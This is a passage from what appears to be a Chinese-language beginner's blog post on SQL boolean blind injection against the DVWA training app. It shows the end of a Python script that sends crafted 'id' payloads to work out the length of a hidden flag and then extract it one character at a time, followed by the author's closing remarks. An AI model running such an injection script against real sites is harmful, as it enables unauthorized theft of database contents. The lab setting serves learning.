+    for i in range(50):
+       #rowLen_payload = &#39;?id=1\&#39; and length(substr(select flag from flagishere limit &#39;+str(j)+&#39;,1),1)=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        rowLen_payload = &#39;?id=1\&#39; and length(substr((select flag from flagishere limit &#39;+str(j)+&#39;,1),1))=&#39;+str(i)+&#39; %23&amp;Submit=Submit#&#39;
+        if &#39;User ID exists in the database.&#39; in s.get(url+rowLen_payload, headers=headers).text:    
+            rowLen = i
+            print(&#39;row&#39;+str(j+1)+&#39;_length: &#39;+str(rowLen))
+            #爆出个字段内容
+            for m in range(1,rowLen+1):
+                for n in payloads:
+                    rowContent_payload = &#39;?id=1\&#39; and substr((select flag from flagishere limit &#39;+str(j)+&#39;,1),&#39;+str(m)+&#39;,1)=\&#39;&#39;+str(n)+&#39;\&#39; %23&amp;Submit=Submit#&#39;
+                    if &#39;User ID exists in the database.&#39; in s.get(url+rowContent_payload, headers=headers).text:
+                        rowContent += n  
+            print(&#39;row&#39;+str(j+1)+&#39;_content: &#39;+rowContent)  
+</code></pre>
 <p><strong>脚本三运行结果如下:</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302172239513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="script3"></p>
 <p><br></p>
 <h1><span id="0x04-总结">0x04 总结</span></h1><p>由于是刚入门的小白，各方面都在起步之中，还有许多需要继续努学习的，尤其要提高自己的代码编写能力，关于sql注入的学习也还会继续。</p>
